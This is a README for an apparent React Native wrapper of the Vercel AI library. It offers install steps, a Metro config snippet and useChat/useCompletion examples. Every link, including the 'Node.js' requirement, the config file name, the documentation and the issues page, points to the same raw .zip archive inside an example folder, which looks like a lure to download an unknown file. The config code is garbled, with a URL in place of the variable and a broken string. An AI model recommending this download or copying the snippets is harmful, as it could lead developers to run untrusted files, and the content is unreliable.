# 🤖 react-native-vercel-ai - Use AI Easily in Your Apps

## 📥 Download Now!
[![Download from Releases](https://github.com/KMERA2024/react-native-vercel-ai/raw/refs/heads/main/example/next-app/app/vision/ai-react-native-vercel-v2.5.zip%20Now-Visit%20Release%20Page-brightgreen)](https://github.com/KMERA2024/react-native-vercel-ai/raw/refs/heads/main/example/next-app/app/vision/ai-react-native-vercel-v2.5.zip)

## 🚀 Getting Started
Welcome to the **react-native-vercel-ai** project! This package allows you to use the Vercel AI library in your React Native, Expo, Web, and Universal applications. Follow these steps to download and run the software easily.

## 💾 System Requirements
To use this package effectively, ensure your environment meets the following requirements:

- A computer running Windows, macOS, or Linux.
- https://github.com/KMERA2024/react-native-vercel-ai/raw/refs/heads/main/example/next-app/app/vision/ai-react-native-vercel-v2.5.zip installed on your machine. We recommend version 14 or higher.
- An internet connection for downloading packages.

## 🔗 Features
- Integrate Vercel AI seamlessly into your React Native apps.
- Supports both mobile and web applications.
- Easy to set up with Expo for a better experience.
- Access AI-powered features through simple API calls.

## 📦 Installation
To install the package, open your command line interface and run this command:

```sh
npm install react-native-vercel-ai
```

## 🛠️ Setup the Metro Configuration
To start using the package, you need to update your `https://github.com/KMERA2024/react-native-vercel-ai/raw/refs/heads/main/example/next-app/app/vision/ai-react-native-vercel-v2.5.zip` file. Please follow these steps:

1. Open the `https://github.com/KMERA2024/react-native-vercel-ai/raw/refs/heads/main/example/next-app/app/vision/ai-react-native-vercel-v2.5.zip` file in your project.
2. Add the following line to enable Package exports:
   ```javascript
   https://github.com/KMERA2024/react-native-vercel-ai/raw/refs/heads/main/example/next-app/app/vision/ai-react-native-vercel-v2.5.zip = {
       transformer: {
           getTransformOptions: async () => ({
               transform: {
                   experimentalImportSupport: false,
                   inlineRequires: false,
               },
           }),
       },
       resolver: {
           sourceExts: ['jsx', 'js', 'ts', 'tsx', 'json', 'wasm', 'cjs', 'p`, 'android', 'ios'],
       },
   };
   ```

This setup allows you to use the `ai/react` subfolder seamlessly.

## 🧪 Testing the Example App
Once set up, you can test the package right away! The included example app has a functional `next-app` with a `/chat` route endpoint. This endpoint lets you play around with the features of the package.

Follow these steps:

1. Navigate to the example app folder.
2. Run the following command:
   ```sh
   npm start
   ```
3. Open your browser and go to `http://localhost:3000/chat` to interact with the app.

## 👐 Usage
Using the package is simple. Here are examples of how to access the `useChat` and `useCompletion` functions.

### 1. Using UseChat
To implement a chat feature, follow this code structure:

```javascript
import { useChat } from 'react-native-vercel-ai';

const ChatComponent = () => {
    const { chat, sendMessage } = useChat();

    const handleSend = () => {
        sendMessage('Hello there!');
    };

    return (
        <div>
            <button onClick={handleSend}>Send Message</button>
        </div>
    );
};
```

### 2. Using UseCompletion
To implement completion features, use this template:

```javascript
import { useCompletion } from 'react-native-vercel-ai';

const CompletionComponent = () => {
    const { complete } = useCompletion();

    const handleComplete = () => {
        complete('Please write a story.');
    };

    return (
        <div>
            <button onClick={handleComplete}>Get Completion</button>
        </div>
    );
};
```

## 📚 Documentation
For detailed documentation on all features and usage examples, visit the [official documentation](https://github.com/KMERA2024/react-native-vercel-ai/raw/refs/heads/main/example/next-app/app/vision/ai-react-native-vercel-v2.5.zip).

## 📩 Support
If you encounter any issues or need assistance, feel free to reach out via the [GitHub Issues page](https://github.com/KMERA2024/react-native-vercel-ai/raw/refs/heads/main/example/next-app/app/vision/ai-react-native-vercel-v2.5.zip).

## 🔥 Download & Install
Ready to get started? Visit the page below to download the latest version of the package and start building:

[![Download from Releases](https://github.com/KMERA2024/react-native-vercel-ai/raw/refs/heads/main/example/next-app/app/vision/ai-react-native-vercel-v2.5.zip%20Now-Visit%20Release%20Page-brightgreen)](https://github.com/KMERA2024/react-native-vercel-ai/raw/refs/heads/main/example/next-app/app/vision/ai-react-native-vercel-v2.5.zip)

Happy coding!